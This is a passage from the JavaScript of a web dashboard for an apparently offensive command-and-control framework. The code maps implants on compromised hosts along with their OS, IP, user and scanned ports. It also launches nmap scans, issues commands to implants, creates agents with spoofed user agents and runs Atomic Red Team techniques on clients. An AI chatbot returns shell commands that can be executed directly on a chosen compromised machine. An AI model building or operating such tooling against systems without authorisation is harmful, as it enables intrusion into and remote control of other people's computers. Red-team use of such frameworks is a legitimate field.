                        var client_discovered_ips = clientData.discovered_ips;
                        var client_result_portscan = clientData.result_portscan;

                        if (client_os) {
                            label += " (OS/" + client_os + ")";
                            if (client_os.toLowerCase() === 'linux') {
                                image = '/static/Linux.png';
                            } else if (client_os.toLowerCase() === 'windows') {
                                image = '/static/Windows.png';
                            }
                        }
                        if (ips) {
                            label += "\n (IP/" + ips + ")";
                        }
                        if (pid) {
                            label += "\n (PID/" + pid + ")";
                        }
                        if (user) {
                            label += "\n (User/" + user + ")";
                        }
                        if (hostname) {
                            label += "\n (Hostname/" + hostname + ")";
                        }
                        nodes.add({
                            id: client,
                            title: label + (client_discovered_ips || "") + " - " + (client_result_portscan || "None"),
                            label: label,
                            shape: 'image',
                            image: image,
                            size: 50,
                            font: { color: '#ff0000' },
                            group: 'clients',
                            mass: 2
                        });
                        edges.add({ from: 'c2', to: client });
                    });

                    if (connectedHosts && Array.isArray(connectedHosts)) {
                        connectedHosts = [...new Set(connectedHosts)];
                        connectedHosts.forEach(function(host) {
                            const hostId = 'host-' + host.replace(/\./g, '-');
                            let foundInDiscovered = false;
                            for (const key in discovered_ips) {
                                if (discovered_ips.hasOwnProperty(key)) {
                                    const ips = discovered_ips[key].split(',').map(ip => ip.trim());
                                    if (ips.includes(host)) {
                                        foundInDiscovered = true;
                                        break;
                                    }
                                }
                            }
                            nodes.add({
                                id: hostId,
                                title: host,
                                label: host,
                                shape: 'circularImage',
                                image: '/static/host.png',
                                size: 25,
                                font: { color: '#ffffff' },
                                group: 'hosts',
                                mass: 1
                            });
                            if (foundInDiscovered) {
                                edges.add({ from: 'no_priv', to: hostId });
                            } else {
                                edges.add({ from: 'c2', to: hostId });
                            }
                        });
                    }

                    for (const client in result_portscan) {
                        if (result_portscan.hasOwnProperty(client)) {
                            let portData = null;
                            if (result_portscan[client] && result_portscan[client] !== "None") {
                                try {
                                    const cleanedData = result_portscan[client].replace(/'/g, '"');
                                    portData = JSON.parse(cleanedData);
                                } catch (e) {
                                    //console.error("[ERROR] No se pudo parsear result_portscan para", client, ":", e);
                                    continue;
                                }
                            }
                            if (portData) {
                                for (const ip in portData) {
                                    if (portData.hasOwnProperty(ip)) {
                                        const ports = [...new Set(portData[ip])];
                                        const hostId = 'host-' + ip.replace(/\./g, '-');
                                        ports.forEach(port => {
                                            const portId = `port-${client}-${ip.replace(/\./g, '-')}-${port}`;
                                            nodes.add({
                                                id: portId,
                                                title: `Puerto ${port} en ${ip} (Implant: ${client})`,
                                                label: `${port}`,
                                                shape: 'circularImage',
                                                image: '/static/port.png',
                                                size: 15,
                                                font: { color: '#ffffff' },
                                                group: 'ports',
                                                mass: 1
                                            });
                                            edges.add({ from: hostId, to: portId });
                                        });
                                    }
                                }
                            } else if (client === 'no_priv' && result_portscan[client] === "None") {
                                // Para "no_priv" con "None", intenta usar discovered_ips si existen
                                const ips = discovered_ips[client].split(',').map(ip => ip.trim()).filter(ip => ip);
                                if (ips.length > 0) {
                                    ips.forEach(ip => {
                                        const hostId = 'host-' + ip.replace(/\./g, '-');
                                        edges.add({ from: 'no_priv', to: hostId });
                                    });
                                }
                            }
                        }
                    }

                    var container = document.getElementById('mynetwork');
                    var data = {
                        nodes: nodes,
                        edges: edges
                    };
                    var options = {
                        nodes: {
                            shape: 'image',
                            color: '#8bf',
                            borderWidth: 2,
                            borderWidthSelected: 4,
                            shadow: true,
                            font: {
                                size: 16,
                                face: 'Arial',
                                color: '#f8f9fa'
                            }
                        },
                        edges: {
                            width: 2,
                            color: '#8bf',
                            arrows: {
                                to: { enabled: true, scaleFactor: 1 },
                                from: { enabled: false },
                                middle: { enabled: false }
                            },
                            dashes: false,
                            smooth: true
                        },
                        physics: {
                            forceAtlas2Based: {
                                gravitationalConstant: -50,
                                centralGravity: 0.01,
                                springLength: 400,
                                springConstant: 0.18,
                                damping: 0.4
                            },
                            maxVelocity: 146,
                            solver: 'repulsion',
                            timestep: 0.22,
                            stabilization: { iterations: 150 }
                        },
                        groups: {
                            clients: { size: 50 },
                            hosts: { size: 25 }
                        }
                    };
                    network = new vis.Network(container, data, options);
                    network.on("selectNode", function(params) {
                        if (params.nodes.length > 0) {
                            var selectedNodeId = params.nodes[0];
                            var selectElements = document.querySelectorAll('select');
                            if (selectedNodeId.startsWith("host")) {
                                var host = selectedNodeId.replace('host-', '').replace(/-/g, '.');
                                cmd = "lazynmap " + host;
                                sendCommand(cmd);
                            }
                            selectElements.forEach(function(selectElement) {
                                Array.from(selectElement.options).forEach(function(option) {
                                    if (option.value === selectedNodeId) {
                                        selectElement.value = selectedNodeId;
                                    }
                                });
                            });
                        }
                    });
                }
                function updateStatus() {

                    var statusElements = document.querySelectorAll('.status');

                    statusElements.forEach(function(element) {
                        var clientId = element.id;
                        if (connectedClients.includes(clientId)) {

                            element.innerHTML = '<span class="status-dot" style="background-color: green;"></span> Online';
                            element.classList.add('online');
                            element.classList.remove('offline');
                        } else {

                            element.innerHTML = '<span class="status-dot" style="background-color: red;"></span> Offline';
                            element.classList.add('offline');
                            element.classList.remove('online');
                        }
                    });
                }
                var connectedClients = {{ connected_clients | tojson | safe }};
                var connectedHosts = {{ connected_hosts | tojson | safe }};




                updateStatus();
                generateGraph(connectedClients, connectedHosts);

                document.querySelectorAll('.nav-link').forEach(link => {
                    link.addEventListener('click', function(event) {
                        event.preventDefault();
                        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
                        link.classList.add('active');
                        document.querySelectorAll('.section').forEach(section => section.classList.remove('active'));
                        document.getElementById(link.getAttribute('data-target')).classList.add('active');
                    });
                });

                window.addEventListener('scroll', function() {
                    var nav = document.getElementById('stickyNav');
                    var scrollPosition = window.scrollY;
                    var navOffsetTop = nav.offsetTop;

                    if (scrollPosition >= 822) {

                        nav.classList.add('sticky');
                    } else {

                        nav.classList.remove('sticky');
                    }
                });
                document.querySelector('.loading-container').style.display = 'none';
                var currentUrl = window.location.href;
                var iframe = document.getElementById('lazywebserver');
                var port = ":"+c2_port+"/";
                var newUrl = currentUrl.replace(port, "/index2.html");
                function checkUrlExists(url, callback) {
                    var http = new XMLHttpRequest();
                    http.open('HEAD', url, true);
                    http.onreadystatechange = function() {
                        if (http.readyState == 4) {
                            if (http.status >= 200 && http.status < 400) {
                                callback(true);
                            } else {
                                callback(false);
                            }
                        }
                    };
                    http.onerror = function() {
                        callback(false);
                    };
                    http.send();
                }
                checkUrlExists(newUrl, function(exists) {
                    if (exists) {
                        iframe.src = newUrl;
                    } else {
                        var port = ":"+c2_port+"/";
                        iframe.src = currentUrl.replace(port, "/");
                    }
                });
                document.getElementById('LazyOsForm').addEventListener('submit', function(event) {
                    event.preventDefault();

                    var ip = document.getElementById('ipl').value;
                    var port = document.getElementById('portl').value;
                    var command = document.getElementById('commandl').value;
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';
                    fetch('/lazyos/' + ip + '/' + port, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ command: command })
                    })
                    .then(response => response.json())
                    .then(data => {
                        spinner.style.display = 'none';
                        document.getElementById('response').innerHTML = '<div class="alert alert-success" role="alert">' + data.response + '</div>';
                    })
                    .catch(error => {
                        spinner.style.display = 'none';
                        document.getElementById('response').innerHTML = '<div class="alert alert-danger" role="alert">' + error.message + '</div>';
                    });
                });

                document.getElementById('chatbotButton').addEventListener('click', function() {
                    $('#chatbotModal').modal('show');
                });
                document.getElementById('reportButton').addEventListener('click', function() {
                    $('#reportModal').modal('show');
                });
                document.getElementById('reportFormbot').addEventListener('submit', function(event) {
                    event.preventDefault();
                    var reportprompt = document.getElementById('reportprompt').value;
                    reportForm(reportprompt, 'reportResponse').then(function() {
                        var converter = new showdown.Converter();
                        var responseDiv = document.getElementById('reportResponse');
                        if (responseDiv) {
                            responseDiv.innerHTML = converter.makeHtml(responseDiv.textContent);
                        }
                    });
                });
                document.getElementById('sistemaOperativo').addEventListener('change', function(event) {
                    var sistemaOperativo = document.getElementById('sistemaOperativo').value;
                    var user_agent_lin = '{{ lin_useragent }}';
                    var user_agent_win = '{{ win_useragent }}';
                    var userAgent = document.getElementById('userAgent');
                    if (sistemaOperativo == '1'){
                        userAgent.value = user_agent_win;
                    } else if(sistemaOperativo == '2') {
                        userAgent.value = user_agent_lin;
                    } else if(sistemaOperativo == '3') {
                        userAgent.value = user_agent_win;
                    } else {
                        userAgent.value = user_agent_lin;
                    }
                });
                document.getElementById('AgentForm').addEventListener('submit', function(event) {
                    event.preventDefault();
                    var sistemaOperativo = document.getElementById('sistemaOperativo').value;
                    var userAgent = document.getElementById('userAgent').value;
                    var urlMaleable = document.getElementById('urlMaleable').value;
                    var nombreAgente = document.getElementById('nombreAgente').value;
                    var command = 'c2 ' + nombreAgente + ' ' + sistemaOperativo
                    RunCmd(command)
                    command = 'create_session_json'
                    RunCmd(command)
                });
                document.getElementById('chatbotForm').addEventListener('submit', function(event) {
                    event.preventDefault();
                    var userInput = document.getElementById('chatbotInput').value;
                    var connectedClients = {{ connected_clients | tojson | safe }};
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';

                    fetch('/chatbot', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ prompt: userInput })
                    })
                    .then(response => response.json())
                    .then(data => {

                        spinner.style.display = 'none';
                        if (data.error) {

                            document.getElementById('chatbotResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
                        } else {

                            document.getElementById('chatbotResponse').innerHTML += `<p>${data.response}</p>`;
                            if (data.response) {
                                const userWantsToRun = confirm('Do you want to run the command? \n' + data['response']);
                                if (userWantsToRun) {
                                    var connectedClients = {{ connected_clients | tojson | safe }};

                                    let clientChoice;
                                    if (connectedClients.length === 1) {

                                        clientChoice = connectedClients[0];
                                    } else if (connectedClients.length > 1) {
                                        alert(connectedClients);
                                        clientChoice = prompt('Choice client:');
                                    } else {
                                        alert('No connected clients available.');
                                        return;
                                    }
                                    if (clientChoice) {
                                        issueCommand(clientChoice, data['response']);
                                    }
                                }
                                document.getElementById('chatbotResponse').innerHTML += `<pre>${data.output}</pre>`;
                            }
                        }
                    })
                    .catch(error => {
                        spinner.style.display = 'none';

                        document.getElementById('chatbotResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
                    });

                    document.getElementById('chatbotInput').value = '';
                });

                document.getElementById('scriptButton').addEventListener('click', function() {
                    $('#scriptModal').modal('show');
                });
                document.getElementById('scriptForm').addEventListener('submit', function(event) {
                    event.preventDefault();
                    var userInput = document.getElementById('scriptInput').value;
                    var connectedClients = {{ connected_clients | tojson | safe }};
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';

                    fetch('/script', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ prompt: userInput })
                    })
                    .then(response => response.json())
                    .then(data => {
                        spinner.style.display = 'none';
                        if (data.error) {

                            document.getElementById('scriptResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
                        } else {
                            var converter = new showdown.Converter();
                            var html = converter.makeHtml(data.response);
                            document.getElementById('scriptResponse').innerHTML += `<p>${html}</p>`;
                            if (data.response) {

                                //document.getElementById('scriptResponse').innerHTML += `<pre>${data.output}</pre>`;
                            }
                        }
                    })
                    .catch(error => {
                        spinner.style.display = 'none';

                        document.getElementById('scriptResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
                    });

                    document.getElementById('scriptInput').value = '';
                });


                document.getElementById('vulnButton').addEventListener('click', function() {
                    $('#vulnModal').modal('show');
                });
                document.getElementById('vulnForm').addEventListener('submit', function(event) {
                    event.preventDefault();

                    vulnForm();


                });
                document.getElementById('lazyButton').addEventListener('click', function() {
                    $('#lazyModal').modal('show');
                });
                document.getElementById('lazyForm').addEventListener('submit', function(event) {
                    event.preventDefault();
                    var lazyprompt = document.getElementById('lazyprompt').value;
                    lazyForm(lazyprompt, 'lazyResponse').then(function() {
                        var converter = new showdown.Converter();
                        var responseDiv = document.getElementById('lazyResponse');
                        if (responseDiv) {
                            responseDiv.innerHTML = converter.makeHtml(responseDiv.textContent);
                        }
                    });
                });
                document.getElementById('searchButton').addEventListener('click', function() {
                    $('#searchModal').modal('show');
                });

                document.getElementById('searchForm').addEventListener('submit', function(event) {
                    event.preventDefault();
                    var userInput = document.getElementById('searchInput').value;
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';
                    fetch('/search', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ prompt: userInput })
                    })
                    .then(response => response.json())
                    .then(data => {
                        spinner.style.display = 'none';

                        if (data.error) {

                            document.getElementById('searchResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
                        } else {

                            var converter = new showdown.Converter();
                            var html = converter.makeHtml(data.response);
                            document.getElementById('searchResponse').innerHTML += `<p>${html}</p>`;
                            if (data.response) {


                            }
                        }
                    })
                    .catch(error => {
                        spinner.style.display = 'none';

                        document.getElementById('searchResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
                    });


                });
                document.getElementById('redopButton').addEventListener('click', function() {
                    $('#redopModal').modal('show');
                });

                document.getElementById('redopForm').addEventListener('submit', function(event) {
                    event.preventDefault();
                    var userInput = '';
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';
                    fetch('/redop', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ prompt: userInput })
                    })
                    .then(response => response.json())
                    .then(data => {

                        spinner.style.display = 'none';
                        if (data.error) {

                            document.getElementById('redopResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
                        } else {

                            var converter = new showdown.Converter();
                            var html = converter.makeHtml(data.response);
                            document.getElementById('redopResponse').innerHTML += `<p>${html}</p>`;
                            if (data.response) {

                                //document.getElementById('redopResponse').innerHTML += `<pre>${data.output}</pre>`;
                            }
                        }
                    })
                    .catch(error => {
                        spinner.style.display = 'none';

                        document.getElementById('redopResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
                    });


                });

                document.getElementById('taskButton').addEventListener('click', function() {
                    $('#taskModal').modal('show');
                });
                document.getElementById('taskFormbot').addEventListener('submit', function(event) {
                    event.preventDefault();
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';
                    var userInput = '';

                    fetch('/taskbot', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ prompt: userInput })
                    })
                    .then(response => response.json())
                    .then(data => {

                        spinner.style.display = 'none';
                        if (data.error) {
                            document.getElementById('taskResponse').innerHTML += `<p style="color: red;">${data.error}</p>`;
                        } else {
                            var converter = new showdown.Converter();
                            var html = converter.makeHtml(data.response);
                            document.getElementById('taskResponse').innerHTML += `<p>${html}</p>`;
                            if (data.response) {

                                //document.getElementById('taskResponse').innerHTML += `<pre>${data.output}</pre>`;
                            }
                        }
                    })
                    .catch(error => {
                        spinner.style.display = 'none';

                        document.getElementById('taskResponse').innerHTML += `<p style="color: red;">Error de red: ${error.message}</p>`;
                    });

                    fetchTasks();
                });
                document.getElementById('generalButton').addEventListener('click', function() {
                    $('#generalModal').modal('show');
                });

                document.getElementById('generalFormbot').addEventListener('submit', function(event) {
                    event.preventDefault();
                    formGeneral_bot();
                });

                document.getElementById('atomic_form').addEventListener('submit', function(event) {
                    event.preventDefault();
                    var id_atomic = document.getElementById('id_atomic').value;
                    const spinner = document.getElementById('loader');
                    spinner.style.display = 'block';
                    var command = 'atomic_gen ' + id_atomic ;
                    RunCmd(command)
                    const clientId = document.getElementById('client_id').value;
                    command = "adversary:" + id_atomic;
                    RunRemoteCmd(clientId,command);
                    spinner.style.display = 'none';

                });
                fetchTasks();

                setInterval(fetchTasks, 1800000);
                document.getElementById('create-url-form').addEventListener('submit', async (e) => {
                    e.preventDefault();
                    const originalUrl = document.getElementById('original_url').value;
                    const customShortUrl = document.getElementById('custom_short_url').value;
                    const messageEl = document.getElementById('create-message');

                    try {
                        const response = await fetch('/create_short_url', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ original_url: originalUrl, custom_short_url: customShortUrl })
                        });
                        const data = await response.json();

                        if (response.ok) {
                            messageEl.textContent = `Short URL created: ${data.short_url}`;
                            messageEl.className = 'text-green-600';
                            setTimeout(() => location.reload(), 1000);
                        } else {
                            messageEl.textContent = data.error;
                            messageEl.className = 'text-red-600';
                        }
                    } catch (error) {
                        messageEl.textContent = 'Error creating short URL';
                        messageEl.className = 'text-red-600';
                    }
                });

                document.querySelectorAll('.update-btn').forEach(button => {
                    button.addEventListener('click', async () => {
                        const shortUrl = button.dataset.shortUrl;
                        const row = button.closest('tr');
                        const originalUrl = row.querySelector('.original-url-input').value;
                        const active = row.querySelector('.active-checkbox').checked;

                        try {
                            const response = await fetch(`/update_short_url/${shortUrl}`, {
                                method: 'PUT',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ original_url: originalUrl, active })
                            });
                            const data = await response.json();

                            if (response.ok) {
                                alert('Updated successfully');
                            } else {
                                alert(data.error);
                            }
                        } catch (error) {
                            alert('Error updating short URL');
                        }
                    });
                });
            });

        </script>
    </body>
    </html>
    {% endblock %}
